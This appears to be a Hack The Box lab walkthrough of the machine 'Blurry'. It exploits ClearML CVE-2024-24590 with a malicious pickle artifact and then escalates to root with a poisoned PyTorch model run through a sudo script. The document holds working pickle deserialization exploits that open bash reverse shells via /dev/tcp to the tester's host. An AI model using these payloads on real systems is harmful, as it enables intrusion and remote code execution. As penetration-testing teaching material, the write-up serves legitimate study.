---
title: CTF Walkthrough for HTB Machine Blurry
date: 2024-09-23 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [HTB, Writeup, CVE]   
image:
  path: /assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/box-blurry.webp
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Blurry a Hack The Box machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Blurry<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Blurry HTB](https://app.hackthebox.com/machines/Blurry)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance

As with every penetration test, we first start by enumerating open ports on our target using Nmap.
```bash
┌──(pentester㉿kali)-[~/…/Machines/Blurry/Scans/Service]
└─$sudo nmap -n -Pn --disable-arp-ping 10.10.11.19 -sS -oN port-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 00:31 BST
Nmap scan report for 10.10.11.19
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
```

Now that we have a list of open ports, we can fingerprint services running on this port using the Nmap service scan functionality.
```bash
┌──(pentester㉿kali)-[~/…/Machines/Blurry/Scans/Service]    
└─$sudo nmap -n -Pn --disable-arp-ping 10.10.11.19 -sV -sC -p22,80 -oN service-scan.nmap       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 00:31 BST
Nmap scan report for 10.10.11.19                                                              
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

Our target appears to have an SSH server and an HTTP server. The Nmap scan result reveals a subdomain domain of our target. We can use the main domain to fuzz for any virtual host on the target.
```bash
┌──(pentester㉿kali)-[~/…/Machines/Blurry/Scans/Service]
└─$ffuf -ic -c -u http://10.10.11.19 -H "Host: FUZZ.blurry.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 169

<SNIP>

app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 95ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 378ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 264ms]
:: Progress: [151265/151265] :: Job [1/1] :: 602 req/sec :: Duration: [0:04:39] :: Errors: 0 ::
```

Our fuzzing seems to be successful. Let's add the main domain and the subdomains to our /etc/hosts file.
```bash
┌──(pentester㉿kali)-[~/…/Machines/Blurry/Scans/Service]
└─$echo "10.10.11.19\tblurry.htb  app.blurry.htb  chat.blurry.htb files.blurry.htb" | sudo tee -a /etc/hosts     
10.10.11.19     blurry.htb  app.blurry.htb  chat.blurry.htb files.blurry.htb
```

Now that our setup is ready we can start by enumerating the first subdomain that's app.blurry.htb. We can visit the webpage to understand its functions.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/1-browse.png)

This resembles a web-based application. Since it is our first time to see this, let's make a quick Google search using the name ClearML as shown on the interface above.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/what-is-clearml.png)

This web-based application appears to help in AI/ML. In our case, we can create a user account in the application. 
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/2-browse.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/app-login.png){: .center}

Once created, we can go to the settings tab to enumerate the version number of this web-based application.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/clearml-version.png)

With this version number, we can search for any vulnerability online. This version appears to be vulnerable to CVE-2024-24590 as shown below.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/clearml-vuln.png)

## Exploitation

This vulnerability appears to exploit the pickle library deserialization process to run arbitrary commands on the target. There are many POCs out there to exploit this vulnerability but [this post](https://medium.com/@vishalchaudharydevsec/hacking-clearml-using-malicious-pickle-file-upload-pickle-deserialization-41182d731cd2) explains the step by step procedure. We can start the exploitation process by first installing the clearml Python package and creating new credentials as shown on the Getting Started page.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/clearml-setup.png)
```bash
┌──(pentester㉿kali)-[~/…/HackthBox/Machines/Blurry/Misc Files]
└─$ sudo pip3 install clearml
<SNIP>

┌──(pentester㉿kali)-[~/…/HackthBox/Machines/Blurry/Misc Files]
└─$clearml-init                                               
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api { 
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "C8Q3C5AYOFW5TBZGQSMV"
        "secret_key"  = "C3fVI1hy1xUFV3S0qcsasJNggZDnmUG5z6EYB6CGSUuFTFXXMg"
    }
}
Detected credentials key="C8Q3C5AYOFW5TBZGQSMV" secret="C3fV***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/pentester/clearml.conf
ClearML setup completed successfully.
```

The configuration we pasted here by visiting Settings -> Workspace.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/clearml-create-cred.png)

If we look attentively at the configuration we pasted, we will notice that this configuration contains a new subdomain called api.blurry.htb that we did not enumerate above. Let's add this domain to our /etc/file before we continue the exploitation process.
```bash
┌──(pentester㉿kali)-[~/…/HackthBox/Machines/Blurry/Misc Files]
└─$echo "10.10.11.19\tapi.blurry.htb" | sudo tee -a /etc/hosts
10.10.11.19     api.blurry.htb
```

To exploit this vulnerability we need a project name. Our Clearml instance seems to have already made projects so let's use one of them.
![](/assets/img/posts/walthrough/hackthebox/2024-09-23-blurry/existing-project.png)

Now, we can copy the script found on the page above and replace the IP address, Listening port, and project name.
```bash
┌──(pentester㉿kali)-[~/…/HackthBox/Machines/Blurry/Misc Files]
└─$ cat << EOF > clearml-exploit.py
heredoc> import pickle
import os
from clearml import Task

class RunCommand:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/4444  0>&1"',))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
heredoc> EOF        
```

Before executing the exploit above, we need to start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackthBox/Machines/Blurry]
└─$nc -lvnp 4444 
listening on [any] 4444 ...
```
Next, we need to execute the exploit and wait for the process to finish to gain a reverse shell.
```bash
┌──(pentester㉿kali)-[~/…/HackthBox/Machines/Blurry/Misc Files]
└─$python3 clearml-exploit.py
ClearML Task: created new task id=9b9c58ae60c84b2a978bb71245ca9abb
2024-09-22 11:47:24,152 - clearml.Task - INFO - No repository found, storing script code instead
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/9b9c58ae60c84b2a978bb71245ca9abb/output/log
CLEARML-SERVER new package available: UPGRADE to v1.16.2 is recommended!
Release Notes:
### Bug Fixes
- Fix no graphs are shown in workers and queues screens
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
```

If we go back to our listener we will notice that we have obtained a reverse connection from the target. We can upgrade this simple shell to a tty shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackthBox/Machines/Blurry]
└─$nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.19] 44006
bash: cannot set terminal process group (2648): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
python3 -c 'import pty;pty.spawn("/bin/bash")'
jippity@blurry:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(pentester㉿kali)-[~/Desktop/HackthBox/Machines/Blurry]
└─$stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
jippity@blurry:~$ 
```
We have obtained a shell as the user jippity. We can use this to read the user flag and enumerate the system further.

## Post Exploitation

A quick enumeration of the user's sudo rights reveals that jipitty can run the /usr/bin/evaluate_model script on any file in the /models/ directory having the pth extension
```bash
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
jippity@blurry:~$ file /usr/bin/evaluate_model
/usr/bin/evaluate_model: Bourne-Again shell script, ASCII text executable
```

This script appears to run another Python script in the /models directory called evaluate_model.py with the Pytorch file as an argument to the Python script.
```bash
jippity@blurry:~$ cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi
```

During a model evaluation, the Pytorch model here is unpickled with the help of the pickle library. This [post](https://medium.com/@coding-otter/understanding-pickle-risks-essential-knowledge-for-data-scientists-1f187feb455b) explains how to create malicious models that will execute arbitrary commands on the target when unpickled. Since we have write permission on the /models directory we can create a malicious model in that directory and run the /usr/bin/evaluate_model as root on that model to execute commands as root on the target.
```bash
jippity@blurry:~$ ls -l /
total 64
<SNIP>
drwxr-xr-x   2 root root     4096 Nov  7  2023 mnt
drwxrwxr-x   2 root jippity  4096 Aug  1 11:37 models
<SNIP>
```

To create our model we can run the script below on the target.
```bash
jippity@blurry:/tmp$ cat << EOF > mal_model.py
heredoc> import torch
import os
import pickle

class EvilStuff:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/5555 0>&1"',))

evilstuff = EvilStuff()
torch.save(evilstuff, "very_safe_model.pth")
heredoc> EOF

jippity@blurry:/tmp$ python3 mal_model.py 
jippity@blurry:/tmp$ ls -l
<SNIP>
-rw-r--r-- 1 jippity jippity     960 Sep 22 06:37 very_safe_model.pth  
```

Here we will execute a reverse shell command so, let's start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackthBox/Machines/Blurry]
└─$nc -lvnp 5555
listening on [any] 5555 ...
```

Now that our listener is set, we can copy the malicious Pytorch model to the /models directory and execute the /usr/bin/evaluate_model script with sudo privileges.
```bash
jippity@blurry:/tmp$ cp very_safe_model.pth  /models/
jjippity@blurry:/tmp$ sudo /usr/bin/evaluate_model  /models/very_safe_model.pth 
[+] Model /models/very_safe_model.pth is considered safe. Processing...
```

If we go back to our listener we will see a reverse shell connection from the target's root user. We can use this access to read the second flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackthBox/Machines/Blurry]
└─$nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.19] 35772
root@blurry:/tmp# ls /root
ls /root
datasets
root.txt
root@blurry:/tmp# 
```

## Conclusions

Congratulations! In this walkthrough, you have exploited a vulnerable version of ClearML. Ultimately, you exploit a local user's sudo privileges in conjunction with excessive permissions on a directory to escalate to root access. This machine illustrates the critical importance of regular patching practices, helping organisations defend against specific threats. Thank you for following up on this walkthrough.
